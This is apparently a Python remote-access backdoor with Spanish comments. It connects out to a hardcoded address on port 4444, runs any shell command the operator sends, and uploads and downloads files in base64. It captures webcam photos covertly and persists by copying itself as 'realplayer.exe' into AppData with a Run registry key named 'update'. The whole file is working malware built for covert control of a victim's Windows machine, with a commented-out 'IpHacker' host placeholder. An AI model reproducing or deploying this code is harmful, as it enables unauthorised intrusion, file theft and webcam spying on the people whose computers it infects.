import socket, json
import subprocess
import os
import base64
import cv2
import sys
import shutil

#POO
class Backdoor:
    def __init__(self, ip ,port):
        self.persintencia()
        self.coneccion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.coneccion.connect((ip,port))
        
    def persintencia(self):
        evil_file_location = os.environ["appdata"] + "\\realplayer.exe" 
        #Copiamos el archivo que se esta ejecutando en este momento con "sys.executable"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location +'"', shell=True)

    def envio_confiable(self, data):
        try:#Download
            #COloar exepcion por que cuando quitas
            #.decode se puede ejecutar el comando mandar pero no el download  
            json_data = json.dumps(data.decode('utf-8','ignore'))
            self.coneccion.send(json_data.encode('utf-8'))
        except AttributeError:#Mandar
            json_data = json.dumps(data)
            self.coneccion.send(json_data.encode('utf-8'))
     
    def recibir_confiable(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.coneccion.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def cmd(self,command):
        DEVNUL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNUL, stdin=DEVNUL)

    def cambiar_de_directorio(self, path):
        os.chdir(path)
        print( "[+] Cambiando de directorio a " + path)

    def escribir_archivo(self, path, contenido):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(contenido))
            return '[+] subida exitosa'

    def leer_archivo(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())#Lo encapsulamos o lo codificamos en base64

    def tomar_foto(self):
        cap = cv2.VideoCapture(0)
        leido, frame = cap.read()
        if leido == True:
            cv2.imwrite("foto.png", frame)
            print("Foto tomada correctamente")
        else:
            print("Error al acceder a la cámara")

    def run(self):
        
        while True:
            command=self.recibir_confiable()
            try:
                if command[0] == "exit":
                    self.coneccion.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.cambiar_de_directorio(command[1])
                elif command[0] == "download":
                    comando_final = self.leer_archivo(command[1])
                elif command[0] == "mandar":
                    comando_final = self.escribir_archivo(command[1], command[2])
                elif command[0] == "saycheese":
                    self.tomar_foto()
                else:
                    comando_final = self.cmd(command)
            except Exception:
                comando_final = '[+] error durante la ejecucion'

            self.envio_confiable(comando_final)

try:
    my_backdoor = Backdoor('192.168.88.175',4444)
    #my_backdoor = Backdoor('IpHacker',4444)
    my_backdoor.run()
except Exception:
    sys.exit()



